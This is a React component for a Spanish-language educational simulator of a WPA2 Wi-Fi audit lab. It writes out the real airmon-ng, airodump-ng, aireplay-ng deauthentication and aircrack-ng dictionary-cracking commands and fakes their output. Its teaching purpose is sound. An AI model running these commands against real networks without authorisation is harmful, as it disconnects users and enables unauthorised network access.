import React, { useState, useEffect, useRef } from "react";
import { Play, RotateCcw, Wifi, ShieldAlert, Cpu, Terminal, Key } from "lucide-react";

export default function AircrackSimulator() {
  const [step, setStep] = useState<number>(0);
  const [terminalLogsLeft, setTerminalLogsLeft] = useState<string[]>([]);
  const [terminalLogsRight, setTerminalLogsRight] = useState<string[]>([]);
  const [wlan0Active, setWlan0Active] = useState<boolean>(false);
  const [networks, setNetworks] = useState<Array<{ bssid: string; essid: string; signal: string; channel: number; clients: number }>>([]);
  const [scanning, setScanning] = useState<boolean>(false);
  const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null);
  const [deauthing, setDeauthing] = useState<boolean>(false);
  const [handshakeCaptured, setHandshakeCaptured] = useState<boolean>(false);
  const [cracking, setCracking] = useState<boolean>(false);
  const [crackProgress, setCrackProgress] = useState<number>(0);
  const [currentWord, setCurrentWord] = useState<string>("");
  const [crackResult, setCrackResult] = useState<{ success: boolean; password?: string } | null>(null);

  const terminalLeftRef = useRef<HTMLDivElement | null>(null);
  const terminalRightRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    if (terminalLeftRef.current) {
      terminalLeftRef.current.scrollTop = terminalLeftRef.current.scrollHeight;
    }
  }, [terminalLogsLeft, deauthing, cracking]);

  useEffect(() => {
    if (terminalRightRef.current) {
      // Prevent auto-scroll during the broad scan (step 3) so the user can read the airodump command
      if (step !== 3) {
        terminalRightRef.current.scrollTop = terminalRightRef.current.scrollHeight;
      }
    }
  }, [terminalLogsRight, scanning, handshakeCaptured, step]);

  // Simulated list of passwords in dictionaries
  const dictionaryWords = [
    "admin123", "password", "qwerty", "123456", "dragon", "cisco",
    "wireless", "security", "wifi_secret", "987654321", "love123",
    "cybersecurity", "20401867", "oracle", "roottoor", "pass123"
  ];

  const addLogLeft = (log: string) => {
    setTerminalLogsLeft((prev) => [...prev, log]);
  };

  const addLogRight = (log: string) => {
    setTerminalLogsRight((prev) => [...prev, log]);
  };

  const handleVerify = () => {
    if (step !== 0) return;
    addLogLeft("kali@kali:~$ iwconfig");
    addLogLeft("lo        no wireless extensions.");
    addLogLeft("");
    addLogLeft("eth0      no wireless extensions.");
    addLogLeft("");
    addLogLeft("wlan0     IEEE 802.11  ESSID:off/any");
    addLogLeft("          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm");
    addLogLeft("          Retry short limit:7   RTS thr:off   Fragment thr:off");
    addLogLeft("          Power Management:on");
    setStep(1);
  };

  const handleStartMonitor = (method: 'iw' | 'airmon') => {
    if (step !== 1) return;
    
    addLogLeft("");
    if (method === 'airmon') {
      addLogLeft("kali@kali:~$ sudo airmon-ng start wlan0");
      addLogLeft("");
      addLogLeft("Found 2 processes that could cause trouble.");
      addLogLeft("Kill them using 'airmon-ng check kill' before putting");
      addLogLeft("the card in monitor mode.");
      addLogLeft("");
      addLogLeft("PHY     Interface       Driver          Chipset");
      addLogLeft("");
      addLogLeft("phy0    wlan0           mac80211        TP-Link TL-WN722N");
      addLogLeft("                (monitor mode enabled)");
    } else {
      addLogLeft("kali@kali:~$ sudo iw dev wlan0 set type monitor");
      addLogLeft("kali@kali:~$ iwconfig wlan0");
      addLogLeft("wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm");
      addLogLeft("          Retry short limit:7   RTS thr:off   Fragment thr:off");
      addLogLeft("          Power Management:off");
    }
    
    setWlan0Active(true);
    setStep(2);
  };

  const handleStartScanner = () => {
    if (step !== 2) return;
    addLogRight("kali@kali:~$ sudo airodump-ng wlan0");
    setScanning(true);
    setStep(3);

    // Populate simulated networks
    setTimeout(() => {
      setNetworks([
        { bssid: "E6:15:3C:FC:02:EA", essid: "A56", signal: "-56", channel: 1, clients: 1 },
        { bssid: "AA:BB:CC:DD:EE:11", essid: "WiFi_Estudiante_Free", signal: "-72", channel: 6, clients: 4 },
        { bssid: "22:33:44:55:66:77", essid: "AP_Sistemas_Corp", signal: "-60", channel: 11, clients: 0 }
      ]);
      addLogRight("");
      addLogRight(" CH 12 ][ Elapsed: 48 s ][ 2026-07-12 11:00 ]");
      addLogRight("");
      addLogRight(" BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID");
      addLogRight(" 0C:01:4B:AD:8D:A4  -89        5        0    0   7  324   WPA2 CCMP   PSK  CH");
      addLogRight(" D4:01:45:84:BE:36  -86        4        0    0  11  130   WPA2 CCMP   PSK  GU");
      addLogRight(" F0:9B:B8:DD:CB:F0  -77       13        2    0   6  130   WPA2 CCMP   PSK  MA");
      addLogRight(" E6:15:3C:FC:02:EA  -20       23        0    0   1  130   WPA2 CCMP   PSK  A56");
      addLogRight(" 1C:73:E2:26:E4:90  -33       19        1    0   6  400   WPA2 CCMP   PSK  MA");
      addLogRight("");
      addLogRight(" BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes");
      addLogRight(" 0C:01:4B:AD:8D:A4  94:F8:27:F1:81:CF  -86    0 - 1     0        2");
      addLogRight(" 1C:73:E2:26:E4:90  CE:A7:30:86:06:5E  -44    0 - 1     0        2");
      addLogRight(" E6:15:3C:FC:02:EA  9E:86:3B:F4:98:C4  -48    0 - 1     0        2");
    }, 1500);
  };

  const handleSelectNetwork = (bssid: string) => {
    if (step !== 3) return;
    setSelectedNetwork(bssid);
    
    // Simulate Ctrl+C and starting the next command without clearing history
    addLogRight("");
    addLogRight("^C");
    addLogRight("");
    addLogRight(`kali@kali:~$ sudo airodump-ng -c 1 -w captura --bssid ${bssid} wlan0`);
    addLogRight(`11:30:42  Created capture file "captura-01.cap".`);
    addLogRight("");
    addLogRight(` CH 1 ][ Elapsed: 0 mins ][ 2026-07-12 11:30 ]`);
    addLogRight("");
    addLogRight(` BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID`);
    addLogRight(` ${bssid}  -65       59       14    0   1  130   WPA2 CCMP   PSK  A56`);
    addLogRight("");
    addLogRight(` BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes`);
    addLogRight(` ${bssid}  9E:86:3B:F4:98:C4  -32    1e-11     0       626  EAPOL`);
    setStep(4);
  };

  const handleDeauth = () => {
    if (step !== 4) return;
    setDeauthing(true);
    addLogLeft("kali@kali:~$ sudo aireplay-ng -0 9 -a E6:15:3C:FC:02:EA -c 9E:86:3B:F4:98:C4 wlan0");
    addLogLeft("11:32:30  Waiting for beacon frame (BSSID: E6:15:3C:FC:02:EA) on channel 1");

    let counter = 0;
    const interval = setInterval(() => {
      addLogLeft(`11:32:32  Sending 64 directed DeAuth (code 7). STMAC: [9E:86:3B:F4:98:C4] [ ${counter} |68 ACKs]`);
      counter++;
      if (counter >= 9) {
        clearInterval(interval);
        setDeauthing(false);
        setHandshakeCaptured(true);
        setStep(5);
        
        // Update the top line in right terminal to show handshake
        setTerminalLogsRight(prev => {
          const newLogs = [...prev];
          const headerIndex = newLogs.findIndex(log => log.startsWith(" CH 1 ]["));
          if (headerIndex !== -1) {
            newLogs[headerIndex] = ` CH 1 ][ Elapsed: 2 mins ][ 2026-07-12 11:33 ][ WPA handshake: E6:15:3C:FC:02:EA`;
          }
          return newLogs;
        });
      }
    }, 400);
  };

  const handleCrack = (wordlist: string) => {
    if (step !== 5) return;
    setCracking(true);
    setCrackProgress(0);
    setTerminalLogsRight([]);
    addLogLeft(`kali@kali:~$ sudo aircrack-ng -b E6:15:3C:FC:02:EA -w /usr/share/wordlists/${wordlist} captura-01.cap`);
    addLogLeft(`Reading packets, please wait...`);
    addLogLeft(`Opening captura-01.cap`);
    addLogLeft(`Read 71261 packets.`);
    addLogLeft(``);
    addLogLeft(`1 potential targets`);
    addLogLeft(``);

    let index = 0;
    const interval = setInterval(() => {
      if (index < dictionaryWords.length) {
        setCurrentWord(dictionaryWords[index]);
        setCrackProgress((index / dictionaryWords.length) * 100);
        
        // Let's find the correct key
        if (dictionaryWords[index] === "20401867") {
          clearInterval(interval);
          setCrackProgress(100);
          setCracking(false);
          setCrackResult({ success: true, password: "20401867" });
          setStep(6);
          addLogLeft("");
          addLogLeft("                                 Aircrack-ng 1.7");
          addLogLeft("");
          addLogLeft("      [00:00:01] 6599/10303727 keys tested (10917.65 k/s)");
          addLogLeft("");
          addLogLeft("      Time left: 15 minutes, 43 seconds                       0.06%");
          addLogLeft("");
          addLogLeft("                           KEY FOUND! [ 20401867 ]");
          addLogLeft("");
          addLogLeft("      Master Key     : CD 2C EF 3E C3 97 87 47 C9 C9 29 BB 54 23 C4 A6");
          addLogLeft("                       A8 DA 57 BC DC 80 BA D1 3E B9 61 7B 0F 04 68 D9");
          addLogLeft("");
          addLogLeft("      Transient Key  : 31 C3 6E D3 96 6A 16 D9 8F A0 5A F5 92 1A CA E7");
          addLogLeft("                       AF C1 FF BA 23 15 C1 65 0F 08 3D 11 3A B6 5D C2");
          addLogLeft("                       7E 2A 45 7F 79 B2 34 2C CE 21 75 53 FC 55 CA BC");
          addLogLeft("                       42 3C 50 2C C5 44 33 D3 D1 77 70 EC 68 EC 8B C3");
          addLogLeft("");
          addLogLeft("      EAPOL HMAC     : 3D CB C9 9E 1A AD 0F 76 15 A5 A2 A3 D4 64 49 58");
          addLogLeft("");
        }
        index++;
      } else {
        clearInterval(interval);
        setCracking(false);
        setCrackResult({ success: false });
        setStep(6);
        addLogLeft("      Passphrase not in dictionary.");
      }
    }, 400);
  };

  const handleReset = () => {
    setStep(0);
    setTerminalLogsLeft([]);
    setTerminalLogsRight([]);
    setWlan0Active(false);
    setNetworks([]);
    setScanning(false);
    setSelectedNetwork(null);
    setDeauthing(false);
    setHandshakeCaptured(false);
    setCracking(false);
    setCrackProgress(0);
    setCurrentWord("");
    setCrackResult(null);
  };

  return (
    <div id="aircrack_simulator_root" className="grid grid-cols-1 lg:grid-cols-12 gap-6">
      {/* Interactive Controls panel */}
      <div className="lg:col-span-5 flex flex-col justify-between space-y-4">
        <div className="bg-slate-50 dark:bg-zinc-900 border border-slate-400 dark:border-zinc-800 rounded-xl p-5 shadow-xs">
          <h3 className="text-lg font-medium text-slate-900 dark:text-zinc-100 flex flex-wrap items-center gap-2 mb-3">
            <Cpu className="h-5 w-5 text-indigo-500 animate-pulse" /> Panel de Control Táctico
          </h3>
          <p className="text-sm text-slate-700 dark:text-zinc-400 mb-4">
            Sigue paso a paso el laboratorio de auditoría inalámbrica. El objetivo es desautenticar un cliente e interceptar la llave.
          </p>

          {/* Steps guide */}
          <div className="space-y-3 mb-5">
            <div className={`p-3 rounded-lg border text-sm transition-all ${step === 0 ? "bg-indigo-50/50 dark:bg-indigo-950/20 border-indigo-400 dark:border-indigo-900 text-indigo-900 dark:text-indigo-200 font-medium" : "bg-white dark:bg-zinc-950 border-slate-400 dark:border-zinc-900 text-slate-700"}`}>
              <div className="flex justify-between items-center mb-1">
                <span>Paso 1: Verificación de Tarjeta</span>
                {step > 0 && <span className="text-xs text-green-500 font-bold">✓ Completado</span>}
              </div>
              <p className="text-[11px] font-normal leading-tight">Ejecuta <b>iwconfig</b> para ver el nombre de tu tarjeta inalámbrica antes de empezar y verificar que esté en 'Managed'.</p>
              {step === 0 && (
                <button
                  id="btn_verify_iwconfig"
                  onClick={handleVerify}
                  className="mt-2.5 w-full flex flex-wrap items-center justify-center gap-2 py-2 px-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-xs font-semibold cursor-pointer transition-colors"
                >
                  <Terminal className="h-3.5 w-3.5" /> Ejecutar iwconfig
                </button>
              )}
            </div>

            <div className={`p-3 rounded-lg border text-sm transition-all ${step === 1 ? "bg-indigo-50/50 dark:bg-indigo-950/20 border-indigo-400 dark:border-indigo-900 text-indigo-900 dark:text-indigo-200 font-medium" : "bg-white dark:bg-zinc-950 border-slate-400 dark:border-zinc-900 text-slate-700"}`}>
              <div className="flex justify-between items-center mb-1">
                <span>Paso 2: Modo Monitor</span>
                {step > 1 && <span className="text-xs text-green-500 font-bold">✓ Completado</span>}
              </div>
              <p className="text-[11px] font-normal leading-tight">Habilita el modo monitor (radar pasivo). 'airmon-ng' es el comando recomendado.</p>
              {step === 1 && (
                <div className="mt-2.5 grid grid-cols-2 gap-2">
                  <button
                    id="btn_start_monitor_airmon"
                    onClick={() => handleStartMonitor('airmon')}
                    className="flex flex-wrap items-center justify-center gap-1.5 py-2 px-3 bg-indigo-600 hover:bg-indigo-50 dark:bg-indigo-950/300 text-white rounded-lg text-xs font-semibold cursor-pointer transition-colors"
                  >
                    <Wifi className="h-3.5 w-3.5" /> Usar 'airmon-ng'
                  </button>
                  <button
                    id="btn_start_monitor_iw"
                    onClick={() => handleStartMonitor('iw')}
                    className="flex flex-wrap items-center justify-center gap-1.5 py-2 px-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-xs font-semibold cursor-pointer transition-colors"
                  >
                    <Wifi className="h-3.5 w-3.5" /> Usar 'iw' (Alternativo)
                  </button>
                </div>
              )}
            </div>

            <div className={`p-3 rounded-lg border text-sm transition-all ${(step === 2 || step === 3) ? "bg-indigo-50/50 dark:bg-indigo-950/20 border-indigo-400 dark:border-indigo-900 text-indigo-900 dark:text-indigo-200 font-medium" : "bg-white dark:bg-zinc-950 border-slate-400 dark:border-zinc-900 text-slate-700"}`}>
              <div className="flex justify-between items-center mb-1">
                <span>Paso 3: Capturar Redes (Airodump)</span>
                {step > 3 && <span className="text-xs text-green-500 font-bold">✓ Completado</span>}
              </div>
              <p className="text-[11px] font-normal leading-tight">Inicia el escáner general y luego selecciona el Router objetivo de la lista.</p>
              
              {step === 2 && (
                <button
                  id="btn_start_scanner"
                  onClick={handleStartScanner}
                  className="mt-2.5 w-full flex flex-wrap items-center justify-center gap-2 py-2 px-3 bg-emerald-600 hover:bg-emerald-50 dark:bg-emerald-950/300 text-white rounded-lg text-xs font-semibold cursor-pointer transition-colors"
                >
                  <Wifi className="h-3.5 w-3.5" /> Iniciar Escáner
                </button>
              )}

              {step === 3 && (
                <div className="mt-3 space-y-2">
                  {networks.length === 0 ? (
                    <div className="flex flex-wrap items-center justify-center gap-2 text-xs py-3 text-slate-600 dark:text-zinc-600 italic">
                      <span className="animate-spin h-3.5 w-3.5 border-2 border-slate-400 dark:border-zinc-600 border-t-transparent rounded-full"></span>
                      Escaneando el espectro de radio...
                    </div>
                  ) : (
                    networks.map((net) => (
                      <button
                        key={net.bssid}
                        id={`btn_select_net_${net.bssid.replace(/:/g, "")}`}
                        onClick={() => handleSelectNetwork(net.bssid)}
                        className="w-full text-left p-2.5 rounded border border-slate-400 dark:border-zinc-800 bg-white hover:bg-slate-50 dark:bg-zinc-950 dark:hover:bg-zinc-900 flex items-center justify-between cursor-pointer group transition-colors"
                      >
                        <div>
                          <div className="font-semibold text-xs text-slate-800 dark:text-zinc-200 group-hover:text-indigo-600 dark:group-hover:text-indigo-400">{net.essid}</div>
                          <div className="text-[10px] text-slate-600 font-mono">{net.bssid}</div>
                        </div>
                        <div className="text-right text-[10px]">
                          <span className="px-1.5 py-0.5 bg-indigo-50 dark:bg-indigo-950/30 text-indigo-600 dark:text-indigo-400 rounded mr-1">CH {net.channel}</span>
                          <span className="text-slate-700 dark:text-zinc-400 font-semibold">{net.signal}</span>
                        </div>
                      </button>
                    ))
                  )}
                </div>
              )}
            </div>

            <div className={`p-3 rounded-lg border text-sm transition-all ${step === 4 ? "bg-indigo-50/50 dark:bg-indigo-950/20 border-indigo-400 dark:border-indigo-900 text-indigo-900 dark:text-indigo-200 font-medium" : "bg-white dark:bg-zinc-950 border-slate-400 dark:border-zinc-900 text-slate-700"}`}>
              <div className="flex justify-between items-center mb-1">
                <span>Paso 4: Forzar Desautenticación</span>
                {step > 4 && <span className="text-xs text-green-500 font-bold">✓ Handshake Capturado</span>}
              </div>
              <p className="text-[11px] font-normal leading-tight">Usa una <b>SEGUNDA TERMINAL</b> para enviar paquetes de Deauth al cliente. <br/><span className="text-amber-600 dark:text-amber-400 font-semibold italic">Nota: Si no captura nada, reconecta manualmente el Wi-Fi del dispositivo.</span></p>
              {step === 4 && (
                <button
                  id="btn_deauth_client"
                  onClick={handleDeauth}
                  disabled={deauthing}
                  className={`mt-2.5 w-full flex items-center justify-center gap-2 py-2 px-3 rounded-lg text-xs font-semibold cursor-pointer text-white transition-colors ${deauthing ? "bg-amber-600 hover:bg-amber-500" : "bg-red-600 hover:bg-red-500 dark:bg-red-600 dark:hover:bg-red-500"}`}
                >
                  <ShieldAlert className="h-4 w-4" /> {deauthing ? "Lanzando aireplay-ng..." : "Abrir 2da Terminal (Deauth)"}
                </button>
              )}
            </div>

            <div className={`p-3 rounded-lg border text-sm transition-all ${step === 5 ? "bg-indigo-50/50 dark:bg-indigo-950/20 border-indigo-400 dark:border-indigo-900 text-indigo-900 dark:text-indigo-200 font-medium" : "bg-white dark:bg-zinc-950 border-slate-400 dark:border-zinc-900 text-slate-700"}`}>
              <div className="flex justify-between items-center mb-1">
                <span>Paso 5: Descifrado (Aircrack)</span>
                {step > 5 && <span className="text-xs text-green-500 font-bold">✓ Completado</span>}
              </div>
              <p className="text-xs font-normal">Usa un diccionario de contraseñas para romper el handshake por fuerza bruta offline.</p>
              {step === 5 && (
                <div className="mt-2.5 grid grid-cols-2 gap-2">
                  <button
                    id="btn_crack_common"
                    onClick={() => handleCrack("rockyou.txt")}
                    disabled={cracking}
                    className="flex flex-wrap items-center justify-center gap-1.5 py-2 px-3 bg-indigo-600 hover:bg-indigo-50 dark:bg-indigo-950/300 text-white rounded-lg text-xs font-semibold cursor-pointer transition-colors"
                  >
                    <Key className="h-3.5 w-3.5" /> Usar rockyou.txt
                  </button>
                  <button
                    id="btn_crack_kaonashi"
                    onClick={() => handleCrack("kaonashi.txt")}
                    disabled={cracking}
                    className="flex flex-wrap items-center justify-center gap-1.5 py-2 px-3 bg-zinc-800 hover:bg-zinc-700 text-zinc-100 dark:bg-zinc-750 dark:hover:bg-zinc-700 rounded-lg text-xs font-semibold cursor-pointer transition-colors"
                  >
                    <Key className="h-3.5 w-3.5" /> Usar kaonashi.txt
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Progress / Results bar */}
          {cracking && (
            <div className="mt-3 p-3 bg-indigo-50 dark:bg-indigo-950/30 rounded-lg border border-indigo-400 dark:border-indigo-900">
              <div className="flex justify-between text-xs text-indigo-900 dark:text-indigo-200 font-medium mb-1.5">
                <span>Analizando Diccionario...</span>
                <span>{Math.round(crackProgress)}%</span>
              </div>
              <div className="w-full bg-slate-200 dark:bg-zinc-800 h-2 rounded-full overflow-hidden">
                <div className="bg-indigo-600 dark:bg-indigo-600 h-2 rounded-full transition-all duration-300" style={{ width: `${crackProgress}%` }}></div>
              </div>
              <div className="mt-1.5 text-[10px] text-indigo-700 dark:text-indigo-400 font-mono">
                Evaluando: {currentWord}
              </div>
            </div>
          )}

          {crackResult && (
            <div className={`mt-3 p-4 rounded-lg border ${crackResult.success ? "bg-emerald-50 dark:bg-emerald-950/20 border-emerald-400 dark:border-emerald-900 text-emerald-900 dark:text-emerald-200" : "bg-red-50 dark:bg-red-950/20 border-red-400 dark:border-red-900 text-red-900 dark:text-red-200"}`}>
              <div className="flex flex-wrap items-center gap-2 font-bold text-sm mb-1">
                <Key className="h-4.5 w-4.5 text-emerald-500" />
                {crackResult.success ? "¡CONTRASENA ENCONTRADA CON ÉXITO!" : "FALLÓ EL DESCIFRADO"}
              </div>
              <p className="text-xs">
                {crackResult.success 
                  ? `La firma criptográfica del handshake coincide. La contraseña de la red inalámbrica es: ` 
                  : "La contraseña no coincide con ninguna palabra del diccionario. Prueba otro diccionario."}
              </p>
              {crackResult.success && (
                <div className="mt-2.5 px-3 py-2 bg-emerald-100 dark:bg-emerald-950/40 border border-emerald-500 dark:border-emerald-800 rounded font-mono text-center font-bold text-lg tracking-widest">
                  {crackResult.password}
                </div>
              )}
            </div>
          )}
        </div>

        <button
          id="btn_reset_aircrack"
          onClick={handleReset}
          className="w-full flex flex-wrap items-center justify-center gap-2 py-2 px-4 bg-slate-200 hover:bg-slate-300 dark:bg-zinc-800 dark:hover:bg-zinc-700 text-slate-800 dark:text-zinc-200 rounded-lg text-xs font-semibold cursor-pointer transition-colors"
        >
          <RotateCcw className="h-3.5 w-3.5" /> Reiniciar Laboratorio
        </button>
      </div>

      {/* Terminal Views */}
      <div className="lg:col-span-7 flex flex-col gap-4 lg:sticky lg:top-24 lg:self-start h-[520px]">
        
        {/* TOP TERMINAL: Commands (Left in real life, top here for layout) */}
        <div className="bg-slate-950 dark:bg-[#111115] rounded-xl border border-slate-800 flex flex-col h-1/2 overflow-hidden shadow-lg">
          <div className="bg-slate-900 dark:bg-[#18181f] border-b border-slate-800 px-3 py-1.5 flex items-center justify-between">
            <div className="flex flex-wrap items-center gap-2">
              <Terminal className="h-3.5 w-3.5 text-blue-400" />
              <span className="font-mono text-[10px] text-slate-600">Terminal 1: Comandos (iw, aireplay, aircrack)</span>
            </div>
            <div className="flex flex-wrap gap-1.5">
              <div className="w-2.5 h-2.5 rounded-full bg-slate-700"></div>
              <div className="w-2.5 h-2.5 rounded-full bg-slate-700"></div>
            </div>
          </div>
          <div ref={terminalLeftRef} className="flex-1 p-3 font-mono text-[11px] text-blue-300 overflow-y-auto space-y-1 select-text scrollbar-thin scrollbar-thumb-slate-800 scrollbar-track-transparent">
            {terminalLogsLeft.map((log, i) => (
              <div key={i} className="leading-relaxed whitespace-pre">
                {log.startsWith("kali@kali") ? (
                  <span className="text-cyan-400 font-semibold">{log}</span>
                ) : log.includes("KEY FOUND") ? (
                  <span className="text-red-500 font-bold text-[13px]">{log}</span>
                ) : (
                  <span className="text-slate-300">{log}</span>
                )}
              </div>
            ))}
            {deauthing && (
              <div className="animate-pulse text-red-400 mt-2">
                [Transmitting directed DeAuth...]
              </div>
            )}
            {cracking && (
              <div className="animate-pulse text-yellow-300 mt-2">
                [Testing keys...]
              </div>
            )}
          </div>
        </div>

        {/* BOTTOM TERMINAL: Scanner (Right in real life, bottom here) */}
        <div className="bg-slate-950 dark:bg-[#0a0a0c] rounded-xl border border-slate-800 flex flex-col h-1/2 overflow-hidden shadow-lg">
          <div className="bg-slate-900 dark:bg-[#18181f] border-b border-slate-800 px-3 py-1.5 flex items-center justify-between">
            <div className="flex flex-wrap items-center gap-2">
              <Wifi className="h-3.5 w-3.5 text-emerald-500" />
              <span className="font-mono text-[10px] text-slate-600">Terminal 2: Escáner (airodump-ng)</span>
            </div>
            <div className="flex flex-wrap gap-1.5">
              <div className="w-2.5 h-2.5 rounded-full bg-slate-700"></div>
              <div className="w-2.5 h-2.5 rounded-full bg-slate-700"></div>
            </div>
          </div>
          <div ref={terminalRightRef} className="flex-1 p-3 font-mono text-[10px] sm:text-[11px] text-emerald-400 overflow-y-auto space-y-0.5 select-text scrollbar-thin scrollbar-thumb-slate-800 scrollbar-track-transparent">
            {terminalLogsRight.length === 0 ? (
              <div className="text-slate-600 italic">Terminal lista... Esperando ejecución de escáner.</div>
            ) : (
              terminalLogsRight.map((log, i) => (
                <div key={i} className="leading-relaxed whitespace-pre">
                  {log.startsWith("kali@kali") ? (
                    <span className="text-cyan-400 font-semibold">{log}</span>
                  ) : log.includes("WPA handshake") ? (
                    <span className="text-yellow-300 font-bold bg-yellow-500/10 px-1 rounded inline-block">{log}</span>
                  ) : log.includes("BSSID") && log.includes("PWR") ? (
                    <span className="text-emerald-500 font-bold">{log}</span>
                  ) : step >= 3 && (log.includes("A56") || log.includes("9E:86:3B:F4:98:C4")) ? (
                    <span className="text-emerald-50 bg-emerald-50 dark:bg-emerald-950/30 font-bold rounded-sm">{log}</span>
                  ) : (
                    <span>{log}</span>
                  )}
                </div>
              ))
            )}
            {scanning && step === 1 && (
              <div className="animate-pulse text-indigo-300 mt-2">
                Escaneando espectro...
              </div>
            )}
          </div>
        </div>

      </div>
    </div>
  );
}
